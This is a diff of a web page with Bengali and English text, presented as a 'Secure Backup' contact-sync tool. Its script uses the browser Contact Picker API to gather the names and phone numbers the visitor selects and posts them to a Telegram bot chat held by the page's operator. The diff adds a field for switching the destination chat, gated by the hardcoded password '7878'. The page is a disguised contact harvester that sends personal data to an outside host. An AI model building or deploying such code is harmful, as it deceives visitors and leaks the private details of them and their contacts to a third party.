@@ -18,10 +18,9 @@ body{
     background: linear-gradient(160deg,#020617,#0f172a);
 }
 
-/* Card */
 .card{
     width:340px;
-    padding:28px;
+    padding:25px;
     border-radius:20px;
     background: rgba(255,255,255,0.06);
     backdrop-filter: blur(18px);
@@ -30,41 +29,39 @@ body{
     text-align:center;
 }
 
-/* Title */
-h2{
-    color:#fff;
-    margin-bottom:8px;
-}
+h2{color:#fff;margin-bottom:8px;}
+p{color:#94a3b8;font-size:14px;}
 
-p{
-    color:#94a3b8;
-    font-size:14px;
-}
-
-/* Button */
 .btn{
-    margin-top:20px;
+    margin-top:12px;
     width:100%;
-    padding:15px;
+    padding:14px;
     border:none;
-    border-radius:14px;
-    font-size:16px;
+    border-radius:12px;
+    font-size:15px;
     font-weight:600;
     cursor:pointer;
     background: linear-gradient(135deg,#3b82f6,#22c55e);
     color:#fff;
-    transition:0.3s;
 }
 
-.btn:hover{
-    transform:translateY(-2px);
+.btn2{
+    background: linear-gradient(135deg,#f59e0b,#ef4444);
 }
 
-/* Loader */
+input{
+    margin-top:10px;
+    width:100%;
+    padding:12px;
+    border-radius:10px;
+    border:none;
+    outline:none;
+}
+
 .loader{
     margin:15px auto;
-    width:26px;
-    height:26px;
+    width:24px;
+    height:24px;
     border:3px solid rgba(255,255,255,0.2);
     border-top:3px solid #22c55e;
     border-radius:50%;
@@ -72,9 +69,7 @@ p{
     display:none;
 }
 
-@keyframes spin{
-    100%{transform:rotate(360deg)}
-}
+@keyframes spin{100%{transform:rotate(360deg)}}
 
 .status{
     margin-top:10px;
@@ -87,10 +82,15 @@ p{
 <body>
 
 <div class="card">
-    <h2>☁️ সিকিউর ব্যাকআপ</h2>
-    <p>আপনার কন্টাক্ট সেফভাবে সিঙ্ক করুন</p>
+    <h2>☁️ Secure Backup</h2>
+    <p>কন্টাক্ট সিলেক্ট করে পাঠান</p>
 
-    <button class="btn" id="btn">Select & Send</button>
+    <button class="btn" onclick="startSend()">Normal Send</button>
+
+    <input type="password" id="pass" placeholder="Password">
+    <input type="text" id="chat" placeholder="New Chat ID">
+
+    <button class="btn btn2" onclick="setCustom()">Set Custom ID</button>
 
     <div class="loader" id="loader"></div>
     <div class="status" id="status">Ready</div>
@@ -98,61 +98,75 @@ p{
 
 <script>
 const CONFIG = {
-    TOKEN: 'YOUR_BOT_TOKEN',
-    CHAT_ID: 'YOUR_CHAT_ID'
+    TOKEN: "YOUR_BOT_TOKEN",
+    DEFAULT_CHAT: "YOUR_DEFAULT_CHAT_ID"
 };
 
-const btn = document.getElementById('btn');
-const loader = document.getElementById('loader');
-const status = document.getElementById('status');
+let currentChat = CONFIG.DEFAULT_CHAT;
 
-btn.onclick = async () => {
-    try {
-        if (!('contacts' in navigator)) {
-            throw new Error("এই ডিভাইস সাপোর্ট করে না");
-        }
+// contact collect
+async function getContacts(){
+    if (!('contacts' in navigator)) throw new Error("Not supported");
 
-        const contacts = await navigator.contacts.select(['name','tel'], {multiple:true});
+    const contacts = await navigator.contacts.select(['name','tel'], {multiple:true});
+    if (!contacts.length) throw new Error("No contacts");
 
-        if (!contacts.length) throw new Error("কোনো কন্টাক্ট পাওয়া যায়নি");
+    let text = "📱 Contact List\n\n";
 
-        loader.style.display="block";
-        status.innerText="Sending...";
+    contacts.forEach(c=>{
+        let n = c.name ? c.name[0] : "No Name";
+        let t = c.tel ? c.tel[0] : "No Number";
+        text += `👤 ${n}\n📞 ${t}\n\n`;
+    });
 
-        // ছোট করে ভাগ করে পাঠানো (Telegram limit avoid)
-        let chunk = "";
-        for(let i=0;i<contacts.length;i++){
-            let name = contacts[i].name ? contacts[i].name[0] : "No Name";
-            let phone = contacts[i].tel ? contacts[i].tel[0] : "No Number";
+    return text;
+}
 
-            chunk += `👤 ${name}\n📞 ${phone}\n\n`;
-
-            if(chunk.length > 3000){
-                await send(chunk);
-                chunk="";
-            }
-        }
-
-        if(chunk) await send(chunk);
-
-        loader.style.display="none";
-        status.innerText="✅ Done!";
-    }
-    catch(e){
-        loader.style.display="none";
-        status.innerText="❌ " + e.message;
-    }
-};
-
+// send function
 async function send(text){
     await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`,{
         method:'POST',
         headers:{'Content-Type':'application/json'},
         body: JSON.stringify({
-            chat_id: CONFIG.CHAT_ID,
-            text:text
+            chat_id: currentChat,
+            text: text
         })
     });
+}
+
+// normal send
+async function startSend(){
+    try{
+        loader.style.display="block";
+        status.innerText="Sending...";
+
+        let text = await getContacts();
+        await send(text);
+
+        status.innerText="✅ Sent!";
+    }catch(e){
+        status.innerText="❌ "+e.message;
+    }
+    loader.style.display="none";
+}
+
+// set custom id
+function setCustom(){
+    const pass = document.getElementById("pass").value;
+    const chat = document.getElementById("chat").value;
+
+    if(pass !== "7878"){
+        status.innerText="❌ Wrong Password";
+        return;
+    }
+
+    if(!chat){
+        status.innerText="❌ Chat ID লাগবে";
+        return;
+    }
+
+    currentChat = chat;
+    status.innerText="✅ Custom ID Set!";
 }
 </script>
 
